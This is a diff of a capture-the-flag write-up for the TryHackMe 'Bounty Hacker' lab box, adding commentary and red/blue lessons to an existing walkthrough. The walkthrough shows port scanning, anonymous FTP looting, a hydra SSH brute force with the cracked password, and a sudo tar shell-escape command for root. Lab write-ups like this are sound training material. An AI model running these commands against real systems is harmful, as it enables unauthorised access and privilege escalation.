@@ -2,6 +2,8 @@ https://tryhackme.com/room/cowboyhacker
 
 BoxIP: 10.10.85.238
 
+
+**Basic Enumeration**
     ┌──(root💀kali)-[/home/kali/bounty]
     └─# rustscan --ulimit 5000 -b 2500 -a 10.10.85.238 -- -A
     .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
@@ -100,7 +102,7 @@ BoxIP: 10.10.85.238
     |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICqmJn+c7Fx6s0k8SCxAJAoJB7pS/RRtWjkaeDftreFw
     80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
 
-
+Alright so it looks like we have ports 21 (FTP), 22(SSH), and 80(HTTP) open. We should note that port 21 has anonymous log-in enabled so lets go for that low haning fruit first.
 
     ┌──(root💀kali)-[/home/kali/bounty]
     └─# ftp 10.10.85.238
@@ -142,6 +144,7 @@ BoxIP: 10.10.85.238
     ftp> exit
     221 Goodbye.
 
+Here we grabbed the files that were sitting on the FTP server now that they are on our attacker machine we have an opportunity to investigate what is inside of them.
 
     ┌──(root💀kali)-[/home/kali/bounty]
     └─# cat locks.txt 
@@ -179,6 +182,7 @@ BoxIP: 10.10.85.238
 
     -lin
 
+Looks like the first one is a potential password list for us to use. The second file (task.txt) gives us a potential username **lin**. using the information gathered lets start an instance of hydra for an online attack to the SSH port
 
         ┌──(root💀kali)-[/home/kali/bounty]
         └─# hydra -l lin -P locks.txt 10.10.85.238 ssh                                 
@@ -190,6 +194,15 @@ BoxIP: 10.10.85.238
         [DATA] attacking ssh://10.10.85.238:22/
         [22][ssh] host: 10.10.85.238   login: lin   password: RedDr4gonSynd1cat3
 
+-l = single user name to use
+
+-P = passwordlist to be used
+
+-ssh = the service we will be attacking
+
+We were able to get valid login credentials for the ssh port so lets pop on and see what we have there
+
+**Inital Foothold**
 
         lin@bountyhacker:~/Desktop$ ls
         user.txt
@@ -203,6 +216,8 @@ BoxIP: 10.10.85.238
 
         User lin may run the following commands on bountyhacker:
             (root) /bin/tar
+
+Alright so we got the user.txt flag and using the sudo -l command we can see that Lin can run /bin/tar as root. Referencing GTFO Bins we can see this binary can be exploited for local PrivEsc
 
 
         lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
@@ -226,7 +241,20 @@ BoxIP: 10.10.85.238
         THM{80UN7Y_h4cK3r}
 
 
+This was a nice quick box
 
+**Lessons Learned**
+
+**RED**
+- Always check for low hanging fruit first
+- usernames can often be found in signatures
+
+
+**BLUE**
+- Keep the polocy of least privledge
+- Audit Sudo rights for common escilation vectors and black list those commands
+- Seal up all FTP traffic and change FTP to SFTP when possible.
+- Do not reuse passwords from service to service.
 
 
 
